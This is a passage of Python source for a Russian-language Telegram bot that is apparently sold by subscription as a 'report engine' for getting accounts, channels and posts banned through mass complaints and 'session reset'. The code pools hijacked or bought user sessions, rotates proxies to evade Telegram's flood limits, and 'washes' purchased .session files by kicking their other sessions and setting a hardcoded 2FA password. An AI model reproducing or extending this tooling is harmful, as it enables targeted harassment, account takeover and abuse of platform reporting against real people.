        sub_line = "\U0001f7e2 \u0430\u0434\u043c\u0438\u043d \u00b7 \u0431\u0435\u0437 \u043b\u0438\u043c\u0438\u0442\u043e\u0432"
    elif s == "forever":
        sub_line = "\U0001f7e2 \u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
    elif s == "active":
        sub_line = f"\U0001f7e2 \u0434\u043e {until}"
    else:
        sub_line = "\U0001f734 \u043d\u0435\u0442 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0438"
    text = (
        bq(f"<b>{NAME}</b>  \u00b7  \u041f\u0440\u043e\u0444\u0438\u043b\u044c")
        + f"\n\n\U0001f464 <b>{html_mod.escape(u.full_name)}</b>"
        + (f" (@{html_mod.escape(username)})" if username != "\u2014" else "")
        + f"\n\U0001f194 <tg-spoiler>{u.id}</tg-spoiler>"
        + f"\n\U0001f511 {sub_line}"
        + "\n\n\U0001f50c \u0434\u0432\u0438\u0436\u043e\u043a \u0430\u043a\u0442\u0438\u0432\u0435\u043d \u00b7 \u043e\u043d\u043b\u0430\u0439\u043d 24/7"
    )
    await cb.message.edit_caption(
        caption=_cx(text),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
        ]),
    )
    await cb.answer()


@router.callback_query(F.data == "menu:info")
async def menu_info(cb: CallbackQuery):
    text = (
        bq(f"<b>{NAME}</b>  \u00b7  \u0418\u043d\u0444\u043e")
        + "\n\n\U0001f9f0 \u0420\u0435\u043f\u043e\u0440\u0442-\u0434\u0432\u0438\u0436\u043e\u043a \u0434\u043b\u044f Telegram: \u0436\u0438\u0432\u044b\u0435 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u044b, \u0432\u0435\u0431-\u0444\u043e\u0440\u043c\u0430, \u0441\u0431\u0440\u043e\u0441-\u043a\u043e\u043d\u0432\u0435\u0439\u0435\u0440.\n\n"
        + bqe(
            "\u2022 \U0001f4f1 \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u2014 \u0436\u0430\u043b\u043e\u0431\u0430 \u043d\u0430 \u043a\u043e\u043d\u043a\u0440. \u043f\u043e\u0441\u0442\n"
            + "\u2022 \U0001f916 \u0411\u043e\u0442 \u00b7 \U0001f464 \u041f\u0440\u043e\u0444\u0438\u043b\u044c\n"
            + "\u2022 \U0001f4e2 \u041a\u0430\u043d\u0430\u043b/\u0433\u0440\u0443\u043f\u043f\u0430 \u00b7 \U0001f3ad \u0421\u0442\u0438\u043a\u0435\u0440\u043f\u0430\u043a\n"
            + "\u2022 \U0001f310 Web \u2014 \u0441\u044b\u0440\u044b\u0435 POST-\u0432\u044b\u0441\u0442\u0440\u0435\u043b\u044b \u0432 \u0441\u0430\u043f\u043f\u043e\u0440\u0442\n"
            + "\u2022 \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439 \u2014 SendCode + OAuth + 3 \u0436\u0430\u043b\u043e\u0431\u044b + \u043c\u043e\u043d\u0438\u0442\u043e\u0440\n"
            + "\u2022 \U0001f4bb \u041b\u043e\u0433-\u0444\u0430\u0439\u043b \u043f\u043e\u0441\u043b\u0435 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0437\u0430\u043f\u0443\u0441\u043a\u0430"
        )
        + "\n\n<i>v3.1 \u00b7 \u043c\u0438\u043d\u0438\u043c\u0430\u043b</i>"
    )
    await cb.message.edit_caption(
        caption=_cx(text),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
        ]),
    )
    await cb.answer()


# ── admin grant (only bog_archive) ──────────────────────
@router.callback_query(F.data == "menu:grant")
async def menu_grant(cb: CallbackQuery, state: FSMContext):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    await state.set_state(GrantFSM.uid)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>  ·  \U0001f511 Grant")
            + "\n\nПришли <b>ID пользователя</b>, которому выдаём подписку:\n"
            + "<i>например:</i> <code>8661362112</code>"
            + "\n\n(kwargs): отправь цифру, а следующим сообщением — кол-во дней.\n"
            + "Если вместо числа пришлёшь слово <code>forever</code> сроками — подпишу навсегда."
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отозвать подписку", style="danger",
                                  icon_custom_emoji_id="5267123797600783095",
                                  callback_data="grant:revoke")],
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
        ]))
    await cb.answer()


@router.message(GrantFSM.uid)
async def grant_uid(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    if raw.lower() == "forever":
        await state.set_state(GrantFSM.days)
        await state.update_data(forever=True)
        await msg.answer(_cx(
            "✅ Подписка <b>навсегда</b> будет выдана — подтверди командой <code>yes</code>:"),
            parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(raw)
    except ValueError:
        await msg.answer("❌ Нужен числовой Telegram ID.")
        return
    await state.update_data(uid=uid)
    await state.set_state(GrantFSM.days)
    await msg.answer(_cx(
        f"📱 Пользователь <code>{uid}</code>.\n"
        + "Теперь отправь <b>кол-во дней</b> подписки (1 / 7 / 30 / 365 …):"),
        parse_mode=ParseMode.HTML)


@router.message(GrantFSM.days)
async def grant_days(msg: Message, state: FSMContext):
    data = await state.get_data()
    uid = data.get("uid")
    forever = data.get("forever", False)
    raw = (msg.text or "").strip().lower()
    if forever and raw in ("yes", "y"):
        subs = load_subs()
        rec = subs.setdefault(str(uid), {})
        rec["forever"] = True
        save_subs(subs)
        await state.clear()
        await msg.answer(_cx(f"👑 <b>@{uid}</b> получил <b>навсегда</b>."), parse_mode=ParseMode.HTML)
        return
    try:
        days = int(raw)
        if days <= 0:
            raise ValueError
    except ValueError:
        await msg.answer(_cx("❌ Нужно целое положительное число дней."),
                         parse_mode=ParseMode.HTML)
        return
    s, until = grant_ref_bonus(uid, days)
    await state.clear()
    await msg.answer(_cx(
        f"🔐 <b>@{uid}</b> получил <b>{days}</b> дн.\n"
        + f"📅 Подписка до: <b>{until}</b>"),
        parse_mode=ParseMode.HTML)


@router.message(Command("unsub"))
async def cmd_unsub(msg: Message):
    """Remove a user's subscription: /unsub <uid>"""
    if not (user_is_admin(msg.from_user.id)
            or (ADMIN_ID and msg.from_user.id == int(ADMIN_ID))):
        await msg.answer(_cx("⛔️ Команда для админов."),
                         parse_mode=ParseMode.HTML)
        return
    parts = (msg.text or "").split()
    if len(parts) < 2 or not parts[1].lstrip("-").isdigit():
        await msg.answer(_cx("Формат: <code>/unsub 8864452428</code>"),
                         parse_mode=ParseMode.HTML)
        return
    uid = str(int(parts[1]))
    subs = load_subs()
    if uid in subs and not uid.startswith("__"):
        gone = subs.pop(uid)
        save_subs(subs)
        state = "навсегда" if gone.get("forever") else f"до {gone.get('until')}"
        await msg.answer(_cx(
            f"❎ Подписка <b>{uid}</b> снята (была: {state}).\n"
            + "Доступ закроется при следующем действии в меню."),
            parse_mode=ParseMode.HTML)
    else:
        await msg.answer(_cx(
            f"⚠️ У <b>{uid}</b> активной записи нет — подписка не числится."),
            parse_mode=ParseMode.HTML)


def _uid_from_raw(raw: str) -> int | None:
    """Telegram ID or @username → uid, resolved through users.json."""
    raw = (raw or "").strip()
    if raw.lstrip("-").isdigit():
        return int(raw)
    uname = raw.lstrip("@").lower()
    if not uname:
        return None
    try:
        users = load_users() or {}
    except Exception:
        return None
    for uid, rec in users.items():
        if not isinstance(rec, dict):
            continue
        if str(rec.get("username") or "").lower() == uname:
            try:
                return int(uid)
            except ValueError:
                return None
    return None


@router.callback_query(F.data == "grant:revoke")
async def grant_revoke_menu(cb: CallbackQuery, state: FSMContext):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    await state.set_state(GrantFSM.revoke_uid)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>  ·  \U0001f6ab Отзыв подписки")
            + "\n\nПришли <b>ID</b> или <code>@username</code> — покажу, что снимаю."
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
        ]))
    await cb.answer()


@router.message(GrantFSM.revoke_uid)
async def grant_revoke_uid(msg: Message, state: FSMContext):
    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
        return
    uid = _uid_from_raw(msg.text or "")
    if uid is None:
        await msg.answer(_cx(
            "❌ Не нашёл такой ID или username. Пришли цифры или <code>@ник</code>."),
            parse_mode=ParseMode.HTML)
        return
    subs = load_subs()
    rec = subs.get(str(uid))
    await state.clear()
    if not rec:
        await msg.answer(_cx(
            f"⚠️ У <code>{uid}</code> подписки нет — снимать нечего."),
            parse_mode=ParseMode.HTML)
        return
    s, until = sub_quality(subs, uid)
    await msg.answer(_cx(
        f"🚫 Снять подписку с <code>{uid}</code>?\n"
        + f"Сейчас: <b>{s}</b> ({until})"),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="Отозвать", style="danger",
                                 icon_custom_emoji_id="5267123797600783095",
                                 callback_data=f"grant:revoke:yes:{uid}"),
            InlineKeyboardButton(text="Отмена", icon_custom_emoji_id="5258132936401624790",
                                 callback_data="back:home")]]))


@router.callback_query(F.data.startswith("grant:revoke:yes:"))
async def grant_revoke_yes(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    try:
        uid = int(cb.data.rsplit(":", 1)[1])
    except ValueError:
        await cb.answer("битый id", show_alert=True)
        return
    subs = load_subs()
    gone = subs.pop(str(uid), None)
    if not gone:
        await cb.answer("уже снята", show_alert=True)
        return
    save_subs(subs)
    if gone.get("forever"):
        was = "навсегда"
    else:
        until = float(gone.get("until") or 0)
        was = datetime.fromtimestamp(until).strftime("%d.%m.%Y %H:%M") if until else "—"
    await push_send_log("Отзыв подписки",
                        [f"🚫 <code>{uid}</code> — снята (была: {was})"])
    try:
        await cb.message.edit_caption(
            caption=_cx(bq(f"<b>{NAME}</b>  ·  🚫 Подписка снята")
                        + f"\n\n<code>{uid}</code> — отозвана (была: {was})."),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await cb.answer("снято")


@router.message(Command("wl"))
async def cmd_wl(msg: Message):
    """Target whitelist (BR-style): /wl add @name | /wl del @name | /wl list"""
    if not (user_is_admin(msg.from_user.id)
            or (ADMIN_ID and msg.from_user.id == int(ADMIN_ID))):
        await msg.answer("\u26d4\ufe0f \u041a\u043e\u043c\u0430\u043d\u0434\u0430 \u0434\u043b\u044f \u0430\u0434\u043c\u0438\u043d\u043e\u0432.")
        return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer(_cx(
            "\u0424\u043e\u0440\u043c\u0430\u0442:\n"
            "<code>/wl add @username</code>\n"
            "<code>/wl del @username</code>\n"
            "<code>/wl list</code>"),
            parse_mode=ParseMode.HTML)
        return
    action = parts[1].lower()
    cur = _wl_load()
    if action == "list":
        if not cur:
            await msg.answer("\U0001f6e1 \u0411\u0435\u043b\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a \u043f\u0443\u0441\u0442.")
        else:
            body = "\n".join(
                f"\u2022 <code>{html_mod.escape(p)}</code>"
                for p in sorted(set(cur)))
            await msg.answer(_cx(
                f"\U0001f6e1 <b>\u0411\u0435\u043b\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a \u0446\u0435\u043b\u0435\u0439:</b>\n{body}"),
                parse_mode=ParseMode.HTML)
        return
    if len(parts) < 3:
        await msg.answer(_cx("\u041d\u0443\u0436\u0435\u043d \u043f\u0430\u0442\u0442\u0435\u0440\u043d: <code>/wl add @username</code>"),
                         parse_mode=ParseMode.HTML)
        return
    pat = parts[2].strip().lstrip("@").lower()
    if action == "add":
        if pat and pat not in [p.lower() for p in cur]:
            cur.append(pat)
            _wl_save(cur)
        await msg.answer(_cx(
            f"\U0001f6e1 <code>{html_mod.escape(pat)}</code> \u0432 \u0431\u0435\u043b\u043e\u043c \u0441\u043f\u0438\u0441\u043a\u0435."),
            parse_mode=ParseMode.HTML)
    elif action == "del":
        cur = [p for p in cur if p.lower() != pat]
        _wl_save(cur)
        await msg.answer(_cx(
            f"\u274e <code>{html_mod.escape(pat)}</code> \u0443\u0431\u0440\u0430\u043d \u0438\u0437 \u0431\u0435\u043b\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430."),
            parse_mode=ParseMode.HTML)
    else:
        await msg.answer("\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u043e\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435. add / del / list")


@router.message(Command("protect"))
async def cmd_protect(msg: Message):
    """Protect-list: targets the bot refuses to attack, every method.
    /protect add @name | /protect del @name | /protect list"""
    if not (user_is_admin(msg.from_user.id)
            or (ADMIN_ID and msg.from_user.id == int(ADMIN_ID))):
        await msg.answer(_cx("⛔️ Команда для админов."),
                         parse_mode=ParseMode.HTML)
        return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer(_cx(
            "🛡 <b>Протект-лист</b> — цели, которые бот не трогает "
            "ни сносом, ни репортом, ни флудом.\n"
            "Формат:\n<code>/protect add @username</code>\n"
            "<code>/protect del @username</code>\n"
            "<code>/protect list</code>\n\n"
            "Тот же список, что /wl — единый источник истины."),
            parse_mode=ParseMode.HTML)
        return
    action = parts[1].lower()
    cur = _wl_load()
    if action == "list":
        if not cur:
            await msg.answer("🛡 Протект-лист пуст.")
        else:
            body = "\n".join(
                f"• <code>{html_mod.escape(p)}</code>"
                for p in sorted(set(cur)))
            await msg.answer(_cx(
                f"🛡 <b>Протект-лист:</b>\n{body}"),
                parse_mode=ParseMode.HTML)
        return
    if len(parts) < 3:
        await msg.answer(_cx(
            "Нужен паттерн: <code>/protect add @username</code>"),
            parse_mode=ParseMode.HTML)
        return
    pat = parts[2].strip().lstrip("@").lower()
    if action == "add":
        if pat and pat not in [p.lower() for p in cur]:
            cur.append(pat)
            _wl_save(cur)
        await msg.answer(_cx(
            f"🛡 <code>{html_mod.escape(pat)}</code> под протектом — "
            "бот его не сносит."),
            parse_mode=ParseMode.HTML)
    elif action == "del":
        cur = [p for p in cur if p.lower() != pat]
        _wl_save(cur)
        await msg.answer(_cx(
            f"❎ <code>{html_mod.escape(pat)}</code> снят с протекта."),
            parse_mode=ParseMode.HTML)
    else:
        await msg.answer("Неизвестное действие. add / del / list")


@router.message(Command("refgive"))
async def cmd_refgive(msg: Message):
    """Manually credit valid referrals: /refgive <user_id> [count]"""
    if not (user_is_admin(msg.from_user.id)
            or (ADMIN_ID and msg.from_user.id == int(ADMIN_ID))):
        await msg.answer(_cx("⛔️ Команда для админов."),
                         parse_mode=ParseMode.HTML)
        return
    parts = (msg.text or "").split()
    if len(parts) < 2 or not parts[1].lstrip("-").isdigit():
        await msg.answer(_cx("Формат: /refgive 8864452428 [кол-во]"),
                         parse_mode=ParseMode.HTML)
        return
    uid = str(int(parts[1]))
    n = 1
    if len(parts) > 2 and parts[2].lstrip("-").isdigit():
        n = max(1, int(parts[2]))
    users = load_users()
    rec = users.get(uid)
    if rec is None:
        await msg.answer(_cx(
            "⚠️ В базе нет " + uid + " — пусть юзер пискнет боту хотя бы раз."),
            parse_mode=ParseMode.HTML)
        return
    rec["ref_credit"] = (rec.get("ref_credit", 0) or 0) + n
    users[uid] = rec
    save_users(users)
    try:
        valid = await count_valid_refs_async(int(uid))
        left = 5 - (valid % 5)
        tail = "✅ зачтено всего: <b>" + str(valid) + "</b> / до дня: <b>" + str(left) + "</b>"
    except Exception:
        tail = "✅ зачтено — проверь в меню «Проверить заново»"
    await msg.answer(_cx(
        "🎁 <b>" + uid + "</b>: вручную +" + str(n) + " реф.\n" + tail),
        parse_mode=ParseMode.HTML)


# ── admin: add session (file | code, with 2FA) ───────────
@router.callback_query(F.data == "menu:addsess")
async def menu_addsess(cb: CallbackQuery, state: FSMContext):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    _login_client(cb.from_user.id)   # kill a stale login-by-code client
    sessions = load_sessions()
    alive_line = ""
    if sessions:
        alive_line = f"\n🧷 В пуле: <b>{len(sessions)}</b>"
    await state.set_state(AddSession.choose)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>  ·  ➕ Добавить сессию")
            + alive_line
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Загрузить файлом", icon_custom_emoji_id="5258477770735885832",
                                  callback_data="addsess:file"),
             InlineKeyboardButton(text="Через код", icon_custom_emoji_id="5258216851472654189",
                                  callback_data="addsess:code")],
            [InlineKeyboardButton(text="Пересадка (мойка BR)", icon_custom_emoji_id="5258486128742244085",
                                  callback_data="addsess:trans")],
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
        ]))
    await cb.answer()


@router.callback_query(AddSession.choose, F.data == "addsess:file")
async def addsess_file(cb: CallbackQuery, state: FSMContext):
    await state.set_state(AddSession.file)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>  ·  📄 Сессия файлом")
            + "\n\nПришли <b>.session документ</b>.\n"
            + "Файл сохранится в пул и закоммитится в репу (переживёт рестарты)."
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
        ]))
    await cb.answer()


@router.message(AddSession.file, F.document)
async def addsess_file_recv(msg: Message, state: FSMContext):
    doc = msg.document
    name = doc.file_name or "pasted.session"
    if not name.endswith(".session") or not (0 < doc.file_size < 5 * 1024 * 1024):
        await msg.answer(_cx("❌ Нужен документ <code>.session</code> до 5 МБ."),
                         parse_mode=ParseMode.HTML)
        return
    tg_file = await msg.bot.get_file(doc.file_id)
    base = Path(__file__).parent / "sessions"
    base.mkdir(exist_ok=True)
    dest = base / name
    await msg.bot.download_file(tg_file, dest)
    # quick liveness probe so the admin knows what landed
    from telethon import TelegramClient as _TC
    probe_api_id, probe_api_hash = API_ID, API_HASH
    ok, why = False, ""
    try:
        px = load_pin_proxies()
        client = _TC(str(dest.with_suffix("")), probe_api_id, probe_api_hash,
                     proxy=pin_for_session(dest.stem, px))
        await asyncio.wait_for(client.connect(), timeout=15)
        ok = bool(await client.is_user_authorized())
        why = "" if ok else "not authorized"
        try:
            await client.disconnect()
        except Exception:
            pass
    except Exception as e:
        why = type(e).__name__
    commit_file_to_repo(f"sessions/{name}", f"add session {name} (file)")
    await state.clear()
    await msg.answer(_cx(
        bq(f"<b>{NAME}</b>  ·  ✅ Сессия добавлена")
        + f"\n\n🧷 <code>{html_mod.escape(name)}</code> → пул"
        + f"\n🔌 проб: {'✅ живая' if ok else '❌ ' + why}"
        + f"\n📦 в пуле: <b>{len(load_sessions())}</b> сессий"),
        parse_mode=ParseMode.HTML)


@router.message(AddSession.file)
async def addsess_file_wrongtype(msg: Message, state: FSMContext):
    await msg.answer(_cx("\u274C \u042D\u0442\u043E \u043D\u0435 \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 .session. \u0416\u0434\u0443 \u0444\u0430\u0439\u043B."), parse_mode=ParseMode.HTML)


# ── admin: add session via login code ────────────────────
_LOGIN_CLIENTS: dict[int, TelegramClient] = {}

# failed login-code IPs get a short in-memory cooldown; retries
# auto-skip to the next proxy instead of hammering a dead one
_LOGIN_IP_COOL: dict[str, float] = {}


def _login_client(uid: int) -> None:
    """Kill a stale login-by-code client (called on menu open / new flow)."""
    cl = _LOGIN_CLIENTS.pop(uid, None)
    if cl is not None:
        try:
            cl.disconnect()
        except Exception:
            pass


async def _finish_login(msg: Message, state: FSMContext,
                        client: TelegramClient, dest: Path) -> None:
    name = dest.name
    try:
        await client.disconnect()
    except Exception:
        pass
    _LOGIN_CLIENTS.pop(msg.from_user.id, None)
    ok, why = await _session_alive(dest)
    commit_file_to_repo(f"sessions/{name}", f"add session {name} (code)")
    await state.clear()
    await msg.answer(_cx(
        bq(f"<b>{NAME}</b>  ·  ✅ Сессия добавлена")
        + f"\n\n🧷 <code>{html_mod.escape(name)}</code> → пул"
        + f"\n🔌 проб: {'✅ живая' if ok else '❌ ' + why}"
        + f"\n📦 в пуле: <b>{len(load_sessions())}</b> сессий"),
        parse_mode=ParseMode.HTML)


@router.callback_query(AddSession.choose, F.data == "addsess:code")
async def addsess_code(cb: CallbackQuery, state: FSMContext):
    await state.set_state(AddSession.code_phone)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>  ·  📱 Сессия через код")
            + "\n\nПришли <b>номер</b> аккаунта:\n"
            + "<code>+79991234567</code>\n\n"
            + "Бот запросит код входа — пришли его следующим сообщением, "
            + "затем 2FA-пароль, если включён."
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790",
                                  callback_data="back:home")],
        ]))
    await cb.answer()


@router.message(AddSession.code_phone, F.text)
async def addsess_code_phone(msg: Message, state: FSMContext):
    phone = _norm_phone(msg.text or "")
    if not phone:
        await msg.answer(_cx("❌ Нужен номер: <code>+79991234567</code>"),
                         parse_mode=ParseMode.HTML)
        return
    _login_client(msg.from_user.id)   # kill stale client of a previous run
    digits = re.sub(r"\D", "", phone)
    dest = Path(__file__).parent / "sessions" / f"s{digits}.session"
    dest.parent.mkdir(exist_ok=True)
    await state.update_data(phone=phone, dest=str(dest), attempt=0)
    await _login_send_step(msg, state, attempt=0, edit=False)


async def _login_send_step(target, state: FSMContext, attempt: int,
                           edit: bool) -> None:
    """send_code_request through a ROTATING pool IP (base + attempt) —
    the deterministic pin hammering one paid IP is why codes stopped
    arriving. Each retry rides the next proxy in the pool."""
    from telethon.errors import FloodWaitError
    data = await state.get_data()
    phone, dest_s = data.get("phone", ""), data.get("dest", "")
    pool = load_pin_proxies()
    kb = None
    if not pool:
        text = (bq(f"<b>{NAME}</b>  ·  📱 Сессия через код")
                + "\n\n⛔️ Пул прокси пуст — код входа без прокси "
                "не отправляется.\n"
                "Закинь прокси (paid_proxies.txt / proxies.txt) и повтори.")
    else:
        base = int(hashlib.sha1(Path(dest_s).stem.encode()).hexdigest(), 16)
        now = time.time()
        sent, used, k, last_err, client = None, None, 0, "", None
        for k in range(len(pool)):
            i = (base + attempt + k) % len(pool)
            pin = pool[i]
            ip_key = f"{pin[1]}:{pin[2]}"
            if _LOGIN_IP_COOL.get(ip_key, 0) > now:
                continue
            client = TelegramClient(str(Path(dest_s).with_suffix("")),
                                    API_ID, API_HASH, proxy=pin)
            log.info("login send try phone=%s pin=%s attempt=%s",
                     phone, ip_key, attempt + k)
            try:
                await asyncio.wait_for(client.connect(), timeout=15)
                sent = await client.send_code_request(phone)
                used = pin
            except FloodWaitError as e:
                try:
                    await client.disconnect()
                except Exception:
                    pass
                log.warning("login send FloodWait phone=%s pin=%s secs=%s",
                            phone, ip_key, e.seconds)
                last_err = f"FloodWait {e.seconds} сек"
                _LOGIN_IP_COOL[ip_key] = now + 900
                continue
            except Exception as e:
                try:
                    await client.disconnect()
                except Exception:
                    pass
                log.error("login send FAIL phone=%s pin=%s err=%s",
                          phone, ip_key, repr(e)[:160])
                last_err = str(e)[:100]
                _LOGIN_IP_COOL[ip_key] = now + 600
                continue
            break
        if sent is None:
            if not last_err:
                last_err = "нет живого IP в пуле"
            log.error("login send exhausted phone=%s pool=%d err=%s",
                      phone, len(pool), last_err)
            text = (bq(f"<b>{NAME}</b>  ·  📱 Сессия через код")
                    + "\n\n❌ Код не отправлен ни через один IP.\n"
                    f"Причина: <code>{html_mod.escape(last_err)}</code>\n"
                    "Сдохнувшие IP стоят на кулдауне 10 мин; "
                    "кнопка ниже перезапустит подбор.")
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(
                    text="🔄 Не пришёл — другой IP",
                    icon_custom_emoji_id="5258216851472654189",
                    callback_data="addsess:code_retry")]])
        else:
            log.info("login send OK phone=%s pin=%s attempt=%s",
                     phone, f"{used[1]}:{used[2]}", attempt + k)
            _LOGIN_CLIENTS[target.from_user.id] = client
            await state.update_data(phone_hash=sent.phone_code_hash,
                                    attempt=attempt + k)
            await state.set_state(AddSession.code_login)
            text = (bq(f"<b>{NAME}</b>  ·  📟 Код отправлен")
                    + f"\n\nНомер: <code>{html_mod.escape(phone)}</code>"
                    + f"\n🔌 код через: <code>{html_mod.escape(str(used[1]))}"
                    + f":{used[2]}</code>"
                    + (f" (попытка {attempt + k + 1})" if attempt + k else "")
                    + "\nКод придёт в Telegram (или от 777000). "
                    "Пришли его цифры.")
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(
                    text="🔄 Не пришёл — другой IP",
                    icon_custom_emoji_id="5258216851472654189",
                    callback_data="addsess:code_retry")]])
    if edit:
        try:
            await target.message.edit_caption(
                caption=_cx(text), parse_mode=ParseMode.HTML,
                reply_markup=kb)
        except Exception:
            await target.message.answer(_cx(text),
                                        parse_mode=ParseMode.HTML,
                                        reply_markup=kb)
    else:
        await target.answer(_cx(text), parse_mode=ParseMode.HTML,
                            reply_markup=kb)


@router.callback_query(AddSession.code_login,
                       F.data == "addsess:code_retry")
async def addsess_code_retry(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if not data.get("phone"):
        await cb.answer("Начни заново: Сессия → Через код", show_alert=True)
        return
    _login_client(cb.from_user.id)
    await cb.answer("🔄 Пробую другой IP...")
    await _login_send_step(cb, state,
                           attempt=int(data.get("attempt", 0)) + 1,
                           edit=True)


@router.message(AddSession.code_login, F.text)
async def addsess_code_login(msg: Message, state: FSMContext):
    from telethon.errors import (PhoneCodeInvalidError,
                                 PhoneCodeExpiredError,
                                 SessionPasswordNeededError)
    data = await state.get_data()
    client = _LOGIN_CLIENTS.get(msg.from_user.id)
    if client is None:
        await state.clear()
        await msg.answer(_cx("⚠️ Сессия входа истекла — начни заново."),
                         parse_mode=ParseMode.HTML)
        return
    code = (msg.text or "").strip()
    try:
        await client.sign_in(phone=data["phone"], code=code,
                             phone_code_hash=data["phone_hash"])
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await msg.answer(_cx("❌ Код неверный или протух — пришли ещё раз."),
                         parse_mode=ParseMode.HTML)
        return
    except SessionPasswordNeededError:
        await state.set_state(AddSession.code_pw)
        await msg.answer(_cx("🔒 На аккаунте <b>2FA</b> — пришли пароль."),
                         parse_mode=ParseMode.HTML)
        return
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        _LOGIN_CLIENTS.pop(msg.from_user.id, None)
        await state.clear()
        await msg.answer(_cx(
            f"❌ Вход не прошёл: <code>{html_mod.escape(str(e)[:120])}</code>\n"
            "Начни заново: /start → Сессия."),
            parse_mode=ParseMode.HTML)
        return
    await _finish_login(msg, state, client, Path(data["dest"]))


@router.message(AddSession.code_pw, F.text)
async def addsess_code_pw(msg: Message, state: FSMContext):
    data = await state.get_data()
    client = _LOGIN_CLIENTS.get(msg.from_user.id)
    if client is None:
        await state.clear()
        await msg.answer(_cx("⚠️ Сессия входа истекла — начни заново."),
                         parse_mode=ParseMode.HTML)
        return
    try:
        await client.sign_in(password=(msg.text or "").strip())
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        _LOGIN_CLIENTS.pop(msg.from_user.id, None)
        await state.clear()
        await msg.answer(_cx(
            f"❌ Пароль не принят: <code>{html_mod.escape(str(e)[:120])}</code>"),
            parse_mode=ParseMode.HTML)
        return
    await _finish_login(msg, state, client, Path(data["dest"]))


# \u2500\u2500 BR-style transplant: \u043C\u043E\u0439\u043A\u0430 \u043A\u0443\u043F\u043B\u0435\u043D\u043D\u044B\u0445 \u0441\u0435\u0441\u0441\u0438\u0439 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
TRANSPLANT_DIR = Path(__file__).parent / "transplant"
ARCH_2FA_PW = "Arch-V3-2026"


@router.callback_query(AddSession.choose, F.data == "addsess:trans")
async def addsess_trans(cb: CallbackQuery, state: FSMContext):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    await state.set_state(AddSession.trans)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>  \u00B7  \U0001F9EC \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u0435\u0441\u0441\u0438\u0438")
            + "\n\n\u041F\u0440\u0438\u0448\u043B\u0438 <b>\u0421\u042B\u0420\u0423\u042E \u043A\u0443\u043F\u043B\u0435\u043D\u043D\u0443\u044E .session</b> (lolz \u0438 \u0442.\u043F.)."
            + "\n\u042F \u0441\u0430\u043C: \u043A\u0438\u043A\u043D\u0443 \u0447\u0443\u0436\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438, \u0437\u0430\u043F\u0440\u043E\u0448\u0443 \u043A\u043E\u0434,"
